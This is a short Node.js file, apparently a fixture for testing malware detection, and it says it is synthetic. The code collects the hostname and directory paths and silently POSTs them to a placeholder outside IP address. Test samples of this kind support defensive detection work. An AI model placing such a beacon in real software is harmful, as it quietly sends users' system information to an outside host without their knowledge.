// FIXTURE ONLY - synthetic detection test sample, not real malware
const os = require("os");
const http = require("http");
const body = JSON.stringify({ host: os.hostname(), cwd: process.cwd(), path: __dirname });
const req = http.request({ host: "203.0.113.7", port: 80, method: "POST", path: "/c" });
req.on("error", () => {});
req.end(body);
